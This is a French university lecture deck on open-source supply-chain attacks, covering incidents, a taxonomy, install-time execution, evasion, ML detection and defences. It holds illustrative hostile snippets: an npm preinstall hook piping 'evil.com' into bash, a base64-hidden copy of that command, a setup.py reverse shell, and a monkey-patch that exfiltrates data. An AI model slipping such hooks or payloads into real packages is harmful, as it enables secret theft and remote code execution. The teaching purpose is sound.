---
theme: seriph
background: https://cover.sli.dev
class: text-center
highlighter: shiki
lineNumbers: true
info: |
  ## Cours 7 — Open Source Supply Chain Attacks
  Université de Rennes · IRISA · DiverSE
  Olivier Barais
drawings:
  persist: false
transition: slide-left
title: "Cours 7 — Open Source Supply Chain Attacks"
mdc: true
pdf: true
export: true
comark: true
download: true
---

# Open Source  
# Supply Chain Attacks

**DevSecOps 2026** · Cours 7

<div class="pt-8 text-gray-400">
  Olivier Barais — Université de Rennes / IRISA
</div>

<div class="pt-2 text-xs text-gray-500">
  Basé sur les travaux de Ladisa, Plate, Martinez, Barais — SAP Security Research / Université de Rennes
</div>

---
layout: default
---

# Plan du cours

<div class="grid grid-cols-2 gap-4 mt-4">

<div class="p-4 rounded-xl border border-rose-400/40 bg-rose-900/10">
<div class="text-2xl font-bold text-rose-300">01</div>

**Contexte &amp; incidents réels**

<div class="text-sm text-gray-400 mt-1">event-stream, PyTorch-nightly, node-ipc…</div>
</div>

<div class="p-4 rounded-xl border border-amber-400/40 bg-amber-900/10">
<div class="text-2xl font-bold text-amber-300">02</div>

**Taxonomie des attaques**

<div class="text-sm text-gray-400 mt-1">8 catégories, 117 vecteurs d'attaque</div>
</div>

<div class="p-4 rounded-xl border border-emerald-400/40 bg-emerald-900/10">
<div class="text-2xl font-bold text-emerald-300">03</div>

**Comment le code malveillant s'exécute**

<div class="text-sm text-gray-400 mt-1">À l'installation vs à l'exécution</div>
</div>

<div class="p-4 rounded-xl border border-cyan-400/40 bg-cyan-900/10">
<div class="text-2xl font-bold text-cyan-300">04</div>

**Techniques d'évasion**

<div class="text-sm text-gray-400 mt-1">Obfuscation, transformations statique &amp; dynamique</div>
</div>

<div class="p-4 rounded-xl border border-violet-400/40 bg-violet-900/10">
<div class="text-2xl font-bold text-violet-300">05</div>

**Détection automatique**

<div class="text-sm text-gray-400 mt-1">Approche ML cross-langage (npm &amp; PyPI)</div>
</div>

<div class="p-4 rounded-xl border border-sky-400/40 bg-sky-900/10">
<div class="text-2xl font-bold text-sky-300">06</div>

**Analyse des risques &amp; défenses**

<div class="text-sm text-gray-400 mt-1">Scorecard, MITRE ATT&amp;CK, contre-mesures</div>
</div>

</div>

<style>
/* style.css */
.slidev-layout.two-cols-header {
  grid-template-columns: 4fr 2fr;
}
p {
  font-size: 0.9em;
  padding:0.1em;
  margin-top: 0em;
  margin-bottom: 0em;
}
</style>

---
layout: section
---

# 1. Contexte et incidents réels

---

# L'open source est partout

<div class="grid grid-cols-2 gap-6 mt-4">
<div>

> *"Free and Open Source Software (FOSS) constitutes 70–90% of any given piece of modern software solutions."*
> — Linux Foundation / Harvard LISH / OpenSSF, Census II, 2022

**En septembre 2023 :**

> *"[…] we have logged 245,032 malicious packages — meaning in the last year, we've seen the number of malicious packages tripled."*
> — Sonatype, 9th Annual State of the Software Supply Chain, 2023

</div>
<div class="flex flex-col justify-center">

**Trois conditions pour une attaque supply chain réussie :**

```
  1. Spread out   ✓   Le malware est accessible
                      aux utilisateurs en aval

  2. Get used     ✓   Les utilisateurs en aval
                      s'appuient sur le code malveillant

  3. Get executed ✓   Le code malveillant
                      est finalement exécuté
```

</div>
</div>

---

# Frise chronologique : des attaques en accélération

<div class="relative mt-10 pb-2">
  <div class="border-t-2 border-dashed border-gray-600/50 absolute left-2 right-2 top-1.5 rounded"></div>

  <div class="grid grid-cols-6 gap-3 relative">
    <div class="flex flex-col items-center text-center">
      <div class="w-4 h-4 rounded-full bg-rose-400 ring-4 ring-rose-900/40 relative z-10"></div>
      <div class="mt-3 font-bold text-rose-300 text-xl">2018</div>
      <div class="font-semibold">event-stream</div>
      <div class="text-xs text-gray-400 mt-1">Backdoor, 1,5 M de dl/sem (npm)</div>
    </div>
    <div class="flex flex-col items-center text-center">
      <div class="w-4 h-4 rounded-full bg-orange-400 ring-4 ring-orange-900/40 relative z-10"></div>
      <div class="mt-3 font-bold text-orange-300 text-xl">2020</div>
      <div class="font-semibold">SolarWinds</div>
      <div class="text-xs text-gray-400 mt-1">Build serveur compromis</div>
    </div>
    <div class="flex flex-col items-center text-center">
      <div class="w-4 h-4 rounded-full bg-amber-400 ring-4 ring-amber-900/40 relative z-10"></div>
      <div class="mt-3 font-bold text-amber-300 text-xl">2021</div>
      <div class="font-semibold">Dep. Confusion</div>
      <div class="text-xs text-gray-400 mt-1">Birsan · 130 k$ chez Microsoft, Apple…</div>
    </div>
    <div class="flex flex-col items-center text-center">
      <div class="w-4 h-4 rounded-full bg-emerald-400 ring-4 ring-emerald-900/40 relative z-10"></div>
      <div class="mt-3 font-bold text-emerald-300 text-xl">2022</div>
      <div class="font-semibold">node-ipc · PyTorch</div>
      <div class="text-xs text-gray-400 mt-1">Protestware + dep. confusion</div>
    </div>
    <div class="flex flex-col items-center text-center">
      <div class="w-4 h-4 rounded-full bg-cyan-400 ring-4 ring-cyan-900/40 relative z-10"></div>
      <div class="mt-3 font-bold text-cyan-300 text-xl">2023</div>
      <div class="font-semibold">245 032 paquets</div>
      <div class="text-xs text-gray-400 mt-1">malveillants détectés (×3 en 1 an)</div>
    </div>
    <div class="flex flex-col items-center text-center">
      <div class="w-4 h-4 rounded-full bg-violet-400 ring-4 ring-violet-900/40 relative z-10"></div>
      <div class="mt-3 font-bold text-violet-300 text-xl">2024</div>
      <div class="font-semibold">XZ Utils</div>
      <div class="text-xs text-gray-400 mt-1">Backdoor, 2 ans de contributions</div>
    </div>

  </div>
</div>

---

# event-stream (npm, 2018)

**Le paquet :** `event-stream` — 1,5 million de téléchargements/semaine, 1 600 paquets dépendants

**L'attaque :**
- Un utilisateur inconnu (`right9control`) demande la propriété du paquet au mainteneur d'origine **et l'obtient**
- Ajoute `flatmap-stream` comme dépendance malveillante
- Le code malveillant n'est présent que **dans le paquet npm publié** (pas dans le code source git)
- Le malware ne s'exécute que lors d'un build de release du portefeuille Bitcoin *Copay*
- **Découverte par accident** — un warning sur une commande dépréciée

> **Leçon :** Un transfert de propriété de mainteneur suffit à compromettre 1,5M de téléchargements/semaine.

---

# PyTorch-nightly (2022) — Dependency Confusion réelle

**Le mécanisme :**

```
  PyTorch-nightly installe ses dépendances depuis son propre index privé
  
  torchtriton → présent uniquement dans l'index privé, PAS dans PyPI
  
  Les index externes ont priorité sur les index internes ← faille
  
  Attaquant : déploie une version malveillante de torchtriton sur PyPI
  
  pip install pytorch-nightly
     → résout torchtriton
     → préfère PyPI (externe) sur l'index privé
     → installe le payload malveillant ✓
```

**Résultat :** Les machines des développeurs ayant installé PyTorch-nightly en décembre 2022 ont exécuté le malware.

> Référence : [pytorch.org/blog/compromised-nightly-dependency](https://pytorch.org/blog/compromised-nightly-dependency/)

---

# node-ipc / peacenotwar (CVE-2022-23812) — Protestware

**Le cas :**
- `node-ipc` : paquet npm populaire utilisé par Vue CLI
- Versions 10.1.1 et 10.1.2 contiennent du code qui **efface le système de fichiers** des machines dont l'IP est géolocalisée en Biélorussie ou en Russie
- Le code malveillant a été ajouté dans git, puis l'historique a été réécrit
- **Pas un attaquant externe** — le mainteneur lui-même a corrompu son paquet pour des raisons politiques (guerre en Ukraine)

```javascript
// Extrait du code malveillant (node-ipc/dao/ssl-geospec.js)
if (ip && (ip.startsWith('russia') || ip.startsWith('belarus'))) {
  require('peacenotwar')  // → efface les fichiers de l'utilisateur
}
```

> **Protestware :** Un mainteneur qui utilise sa position de confiance pour nuire à une catégorie d'utilisateurs.  
> Cela soulève des questions fondamentales sur la **confiance dans l'open source**.

---
layout: section
---

# 2. Taxonomie des attaques

---

# SoK : Taxonomie des attaques sur la Supply Chain OSS

**Travail de recherche :** Ladisa et al., *SoK: Taxonomy of Attacks on Open-Source Software Supply Chains*, IEEE S&P 2023

<div class="grid grid-cols-2 gap-6 mt-4">
<div>

**Méthodologie :**
- Revue systématique de la littérature (SLR)
- Attaques réelles, PoC, disclosures
- **117 vecteurs d'attaque** uniques identifiés
- **+30 contre-mesures** cartographiées
- **+370 références** scientifiques et grises
- Évaluation par 17 experts + 130 développeurs

</div>
<div>

**Les 3 phases d'une attaque :**

```
  Contributeurs / Mainteneurs
          │  clone / contribute
          ▼
  Version Control (GitHub…)
          │  build
          ▼
  Build System (CI/CD)
          │  publish
          ▼
  Distribution (PyPI, npm…)
          │  download
          ▼
  Consommateurs
```

</div>
</div>

---

# Référence : SAP Risk Explorer

<div class="text-center mb-3">
  <img src="/risk-explorer-screenshot.png" class="mx-auto h-72 rounded shadow" />
</div>

**[sap.github.io/risk-explorer-for-software-supply-chains](https://sap.github.io/risk-explorer-for-software-supply-chains/)**

Outil interactif et open source : explorer les vecteurs d'attaque, filtrer par contre-mesure (ex. *Code Signing*), voir les références associées.

---
zoom: 0.9
---

# Les 8 catégories d'attaque

| ID | Catégorie | Description |
|----|-----------|-------------|
| A1 | Source Code | Injection dans le code source |
| A2 | Build System | Compromission du build |
| A3 | Dependencies | Attaque via les dépendances |
| A4 | Deployment | Compromission du déploiement |
| A5 | Artifact | Compromission des artefacts |
| A6 | Distribution | Compromission du canal de distribution |
| A7 | Contributor | Contributeur malveillant |
| A8 | Infrastructure | Infrastructure compromise |

---

# A1 : Attaques sur le code source

**A1-1 : Injection de code malveillant par un contributeur**
- Contributeur légitime dont le compte est compromis
- Contributeur malveillant (long terme, style XZ Utils — 2 ans de contributions)
- Merge accidentel d'une PR malveillante

**A1-2 : Hypocrite commits** *(Université du Minnesota, 2021 — noyau Linux)*
```c
// Patch 1 (accepté, corrige un vrai bug)
void process_data(char *buf, size_t len) {
    if (len > MAX_SIZE) return;  // ← validation ajoutée
    memcpy(dest, buf, len);
}

// Patch 2 (quelques semaines plus tard, "refactoring")
void process_data(char *buf, size_t len) {
    memcpy(dest, buf, len);  // ← validation "simplifiée" = supprimée
}
```

**A1-3 : Réintroduction de code supprimé** — rouvrir une vulnérabilité corrigée

---

# A3 : Attaques via les dépendances

**A3-1 : Typosquatting**
```
Paquet légitime   → Paquet malveillant
─────────────────   ──────────────────
requests          → requets, request (singulier)
lodash            → lodahs, Lodash (majuscule)
numpy             → numppy, num-py
django            → djang0 (zéro au lieu de o)
```

**A3-2 : Dependency Confusion**
```
Organisation : package interne @acme/auth-lib (registre privé, v2.1.0)
Attaquant    : publie @acme/auth-lib sur npmjs.com (version 99.0.0)
npm résout   → préfère la version publique la plus haute → payload exécuté
```

> **Alex Birsan (2021) :** a exploité cette faille chez Microsoft, Apple, PayPal, Tesla…  
> Bug bounty reçu : **130 000 $** au total.

---

# A3 (suite) : Autres attaques sur les dépendances

**A3-3 : Compromission d'un compte mainteneur**
- Si le token npm d'un mainteneur est volé → publication malveillante sous sa signature
- `event-stream` (2018) : transfert de propriété volontaire, backdoor ciblant Bitcoin Copay
- ~ 1,5 million de téléchargements/semaine concernés

**A3-4 : Abandon + Reprise malveillante**
- Paquet abandonné : l'attaquant en devient mainteneur
- `ua-parser-js` (2021) : compte compromis, 3 versions malveillantes publiées en quelques heures

**A3-5 : Protestware**
- Le mainteneur rend volontairement son paquet malveillant
- `colors.js` et `faker.js` (2022) : maintainer corrompt ses libs (boucles infinies)
- `node-ipc` (2022) : suppression de fichiers selon géolocalisation IP

---

# A4 : Attaques sur le build et le déploiement

**A4-1 : Compromission du serveur de build**
- SolarWinds : serveur MSBuild infecté, code injecté à la compilation
- Le binaire final est signé avec la clé légitime → difficile à détecter

**A4-2 : Cache Poisoning**
```yaml
# CI cache de dépendances
- name: Cache pip
  uses: actions/cache@v3
  with:
    path: ~/.cache/pip
    key: ${{ hashFiles('requirements.txt') }}
# Si la clé de cache est prédictible ou corruptible →
# l'attaquant empoisonne le cache partagé entre jobs
```

**A4-3 : Script de build malveillant**
- `Makefile`, `setup.py`, `postinstall` npm s'exécutent **automatiquement**
- Peuvent exfiltrer des secrets d'environnement CI (tokens, clés AWS…)

---
layout: section
---

# 3. Comment le code malveillant s'exécute

---

# Aveuglément faire confiance au gestionnaire de paquets…

<div class="grid grid-cols-2 gap-6 items-center">
<div>

```bash
# Ce que fait réellement "pip install maratlib"
pip install maratlib

# Équivalent conceptuel de :
curl http://pypi.org/maratlib/latest | bash
```

> *"Blindly installing a 3rd-party dependency  
> can be dangerous."*  
> — Ladisa et al., SCORED'22

L'installateur de paquets est un **vecteur d'exécution de code arbitraire** si le paquet est malveillant.

</div>
<div class="text-center">
  <img src="/this-is-fine-meme.png" class="mx-auto h-56 rounded" />
</div>
</div>

---

# Arbre de décision : comment atteindre l'exécution

<div class="text-center mb-4">
  <img src="/malicious-execution-tree.png" class="mx-auto h-52" />
</div>

<div class="grid grid-cols-2 gap-4 text-sm">
<div>

**À l'installation (install-time) :**
- **I1** — Hooks npm `preinstall`/`postinstall`
- **I2** — Code dans `setup.py` Python
- **I3** — Extension Ruby (`extconf.rb`)

</div>
<div>

**À l'exécution (runtime) :**
- **R1** — Code dans `__init__.py`, `main` js
- **R2** — Méthode couramment utilisée (`doGet()`)
- **R3** — Constructeur d'une classe populaire
- **R4** — Plugin de build Maven

</div>
</div>

---

# I1 — Hooks d'installation (npm)

```json
// package.json
{
  "name": "example",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "curl http://evil.com/payload | bash",
    "postinstall": "node steal-env.js"
  }
}
```

**Exécuté automatiquement** dès `npm install`. L'attaquant a un accès complet à l'environnement CI : variables d'environnement, tokens, fichiers de configuration.

**Écosystèmes concernés :** JavaScript (npm), PHP (composer)

---

# I2 — Code dans setup.py (Python)

```python
# setup.py d'un paquet malveillant
from setuptools import setup
import os

# Exécuté automatiquement par pip lors de l'installation
os.system("chmod +x /tmp/aza-obf.sh")
os.system(payload_decode(u"<chaîne obfusquée>"))  # reverse shell

setup(
    name='maratlib',
    version='0.2',
    description=payload_decode(u"<desc obfusquée>"),
    packages=[],
    zip_safe=False
)
```

**Écosystèmes concernés :** Python (pip), Rust (cargo)

> `pip install maratlib` → exécute immédiatement ce code, avant même que le paquet soit importé.

---

# Exemple réel : maratlib-0.2 (Python)

<div class="text-center">
  <img src="/malicious-python-code.png" class="mx-auto h-80 rounded shadow" />
</div>

<div class="text-xs text-orange-500 mt-2 text-center">
Obfuscation par renommage d'identifiants (l1l_, l11l_, l1ll_…) + eval() + exécution shell à l'installation
</div>

---

# Exemple réel : browserift-16.2.2 (JavaScript)

<div class="text-center">
  <img src="/malicious-js-code.png" class="mx-auto h-56 rounded shadow" />
</div>

```
browserift-16.2.2 (typosquatting de "browserify")
  ├── package.json → "postinstall": "bash build.sh"
  ├── build.sh     → télécharge et exécute index.js
  └── index.js     → reverse shell TCP vers 45.63.54.27:8080
```

---
layout: section
---

# 4. Techniques d'évasion

---

# Les antivirus sont-ils efficaces ?

<div class="text-center mb-4">
  <img src="/virustotal-av-results.png" class="mx-auto h-56 rounded shadow" />
</div>

**Résultats VirusTotal sur la collection Backstabbers' Knife (2884 paquets malveillants) :**

- **npm : 77,1% non détectés** · PyPI : 76,0% non détectés · RubyGems : 60,4% non détectés

> Les antivirus traditionnels sont quasi-inefficaces contre les malwares de supply chain.  
> Raison principale : techniques d'**obfuscation** et **transformation de code**.

---

# Techniques d'évasion — Obfuscation des données

Les malwares codent en dur des URLs, commandes shell, adresses IP. L'obfuscation masque ces artefacts :

**Encodage / Compression / Chiffrement**
```python
# Stockage en base64 pour éviter la détection par pattern matching
import base64
cmd = base64.b64decode("Y3VybCBodHRwOi8vZXZpbC5jb20vcGF5bG9hZCB8IGJhc2g=")
os.system(cmd)  # → curl http://evil.com/payload | bash
```

**Tableaux binaires**
```javascript
// La chaîne "http://evil.com" stockée en valeurs ASCII
var url = [104,116,116,112,58,47,47,101,118,105,108,46,99,111,109]
           .map(c => String.fromCharCode(c)).join('')
```

**Réordonnancement** : la chaîne est découpée en fragments recombinés à l'exécution

---

# Techniques d'évasion — Transformation statique

**Renommage d'identifiants** (vu dans maratlib-0.2)
```python
# Noms de variables illisibles pour masquer la logique
l1l_cringe_ = sys.version_info[0] == 2
l1111_cringe_ = 2048
l11_cringe_ = 7
def l111_cringe_(l1ll1_cringe_):
    # ...
```

**Insertion de code mort**
```javascript
function a() { return 42; }         // jamais appelé
function b() { return a() + 0; }   // jamais appelé
// Code réel noyé dans du bruit
```

**Dissémination dans les dépendances transitives** : le malware est dans une dépendance de niveau 3, quasi-impossible à auditer manuellement.

---

# Techniques d'évasion — Transformation dynamique

**Stéganographie**
```python
# Code malveillant caché dans les pixels d'une image PNG
from PIL import Image
img = Image.open('logo.png')
pixels = list(img.getdata())
# Extraire les bits de poids faible → reconstituer le payload
exec(''.join(chr(p[0] & 0xFF) for p in pixels[:200]))
```

**Monkey Patching** (modification du comportement à l'exécution)
```python
# Intercepte toutes les requêtes HTTP pour exfiltrer les données
import requests
original_post = requests.post
def evil_post(url, **kwargs):
    exfiltrate(kwargs.get('data', ''))  # copie vers serveur attaquant
    return original_post(url, **kwargs)
requests.post = evil_post
```

**Exécution conditionnelle** : le malware ne s'exécute que sur certains OS, dans un contexte de release build, ou après un délai.

---
layout: section
---

# 5. Détection automatique

---

# Objectifs des malwares sur la supply chain

<div class="text-center mb-3">
  <img src="/malicious-objectives.png" class="mx-auto h-52 rounded shadow" />
</div>

**Résultats sur la collection Backstabbers' Knife (Ohm et al., 2020) :**

- **Data Exfiltration : 54–68%** (tokens, credentials, variables d'env, fichiers)
- **Dropper : 29–34%** (télécharge et installe un second payload)
- Backdoor, Financial Gain, DoS : minoritaires

---

# Approche ML — Détection cross-langage

**Hypothèse :** un malware de supply chain, quelle que soit sa langue, présente des caractéristiques communes.

<div class="grid grid-cols-2 gap-6">
<div>

**Un seul modèle pour npm ET PyPI :**

- Features **indépendantes du langage**
- Simples : lexicales, structure du paquet
- Transférables entre langages
- Dataset : Backstabbers' Knife Collection  
  (2 071 JS, 273 Python malveillants)
- Ratio 90/10 (bénins/malveillants) pour l'imbalance

</div>
<div>

**Features sélectionnées :**

- Usage des hooks d'installation
- Nombre d'URLs, d'IPs, de chaînes base64
- Tokens suspects dans les chaînes
- Entropie de Shannon des chaînes/identifiants
- Ratio de `[`, `=`, `+` par taille de fichier
- Count de fichiers par extension

</div>
</div>

---

# Features language-independent (Table complète)

<div class="text-center">
  <img src="/ml-features-table.png" class="mx-auto h-96 rounded shadow" />
</div>

---

# Résultats — Scan de PyPI et npm pendant 10 jours

<div class="text-center mb-3">
  <img src="/cross-language-detection-results.jpg" class="mx-auto h-64 rounded shadow" />
</div>

**Résultats (Ladisa et al., ACSAC'23) :**

- npm : 37 vrais positifs détectés (TP), **1 083 faux positifs** (FP)
- PyPI : 17 TP, **385 FP**
- Le modèle cross-langage détecte **autant** que les modèles mono-langage tout en étant plus général

> Le taux de FP reste le principal défi — beaucoup de petits paquets légitimes ressemblent à des malwares par leurs métadonnées.

---
layout: section
---

# 6. Analyse des risques et défenses

---


# Évaluer la surface d'attaque d'un projet

**Facteurs de risque sur un projet open source :**

| Facteur | Risque faible | Risque élevé |
|---------|--------------|--------------|
| Nombre de mainteneurs | > 5 actifs | 1 seul |
| Fréquence de contribution | Quotidienne | Quelques fois/an |
| Tests automatisés | Couverture > 80% | Peu ou pas |
| Revue de code | PR obligatoire, 2+ reviewers | Merge direct |
| Popularité | Très utilisé, audité régulièrement | Peu connu |
| Gouvernance | Fondation (Linux, Apache, CNCF) | Individu seul |
| Âge du projet | > 5 ans, stable | Récent |

<style>
/* style.css */
.slidev-layout.two-cols-header {
  grid-template-columns: 4fr 2fr;
}
td {
  font-size: 0.9em;
  padding:0.6em;
  margin-top: 0em;
  margin-bottom: 0em;
}
</style>

---

# Outils d'évaluation du risque

**OpenSSF Scorecard :**
```bash
scorecard --repo=github.com/my-org/my-project --format json
```
Évalue : Branch Protection, CI Tests, Code Review, Dependency Update, Fuzzing, License, Maintained, Signed Releases, Token Permissions, Vulnerabilities…

**deps.dev (Google) :**
- [deps.dev](https://deps.dev/) : graphe de dépendances, scorecard, CVE
- API : `https://api.deps.dev/v3/systems/pypi/packages/requests/versions/2.31.0`

**OSS-Fuzz :**
- Fuzzing continu automatisé pour les projets open source critiques
- Plus de 1 000 projets couverts, > 10 000 vulnérabilités trouvées

---

# Framework de défense — MITRE ATT&CK

Techniques répertoriées :
- **T1195.001** — Compromise Software Supply Chain (Build System)
- **T1195.002** — Compromise Software Supply Chain (Software Distribution)
- **T1195.003** — Compromise Software Supply Chain (Software Dependency)

**Défenses par couche :**

| Couche | Contre-mesure principale |
|--------|------------------------|
| Code | Signature de commits, branch protection, 2 reviewers |
| Dépendances | Pinning + hash, audit automatique, SBOM |
| Build | Build reproductible, éphémère, audit des permissions |
| Artefacts | Signature (Cosign/Sigstore), hash publié |
| Distribution | Canal signé, TLS, vérification de hash à l'install |
| Runtime | Scan d'image, politique d'admission (OPA/Kubernetes) |

<style>
/* style.css */
.slidev-layout.two-cols-header {
  grid-template-columns: 4fr 2fr;
}
td {
  font-size: 0.9em;
  padding:0.1em;
  margin-top: 0em;
  margin-bottom: 0em;
}
</style>


---

# Défense contre la Dependency Confusion

```bash
# .npmrc — Toujours forcer le registre privé pour les scopes @acme
@acme:registry=https://registry.acme.internal/

# package.json — Marquer les packages privés explicitement
{
  "name": "@acme/auth",
  "version": "2.1.0",
  "private": true,
  "publishConfig": {
    "registry": "https://registry.acme.internal/"
  }
}
```

**Autres protections :**
- Configurer Artifactory/Nexus pour bloquer les paquets publics homonymes de paquets privés
- Utiliser `allowedPackages` (npm 9+)
- **Réserver les noms** de paquets internes sur les registres publics (même vides)

---
layout: center
class: text-center
---

# À retenir

<div class="grid grid-cols-3 gap-4 mt-6">

<div class="p-4 rounded-xl border border-rose-400/40 bg-rose-900/10 flex flex-col items-center text-center">
<div class="text-4xl mb-2">🕵️</div>
<div class="font-bold text-rose-300">L'attaquant patient</div>
<div class="text-sm text-gray-400 mt-1">XZ Utils : 2 ans de contributions légitimes avant l'attaque</div>
</div>

<div class="p-4 rounded-xl border border-amber-400/40 bg-amber-900/10 flex flex-col items-center text-center">
<div class="text-4xl mb-2">🛡️</div>
<div class="font-bold text-amber-300">77% invisibles</div>
<div class="text-sm text-gray-400 mt-1">des malwares supply chain échappent aux antivirus → détection automatique indispensable</div>
</div>

<div class="p-4 rounded-xl border border-emerald-400/40 bg-emerald-900/10 flex flex-col items-center text-center">
<div class="text-4xl mb-2">🧯</div>
<div class="font-bold text-emerald-300">Un seul point de défaillance</div>
<div class="text-sm text-gray-400 mt-1">un mainteneur unique = un risque unique</div>
</div>

</div>

<div class="flex items-center justify-center flex-wrap gap-2 mt-8">
<span class="px-4 py-2 rounded-full bg-sky-400/15 border border-sky-400/40 text-sky-300 font-medium">Diversifier</span>
<span>→</span>
<span class="px-4 py-2 rounded-full bg-sky-400/15 border border-sky-400/40 text-sky-300 font-medium">Automatiser les audits</span>
<span>→</span>
<span class="px-4 py-2 rounded-full bg-sky-400/15 border border-sky-400/40 text-sky-300 font-medium">Ne jamais faire confiance implicitement</span>
</div>

---
layout: end
---

# Merci

<div class="mt-8 max-w-2xl mx-auto text-left">

**Ressources :**

- 📄 **Poly du cours** : [télécharger le poly (PDF)](https://raw.githubusercontent.com/barais/devsecops.module7/refs/heads/master/poly/poly.pdf)
* [OpenSSF Scorecard](https://scorecard.dev/)
* [deps.dev (Google)](https://deps.dev/)
* [MITRE ATT&CK — Supply Chain T1195](https://attack.mitre.org/techniques/T1195/)
* [Alex Birsan — Dependency Confusion](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)
- ➡️ **Cours suivant — Cours 8 — Reproducible Builds** : [https://olivier.barais.fr/devsecops.module8](https://olivier.barais.fr/devsecops.module8)

</div>

<div class="mt-8 text-sm opacity-50">
Olivier Barais · Module DevSecOps
</div>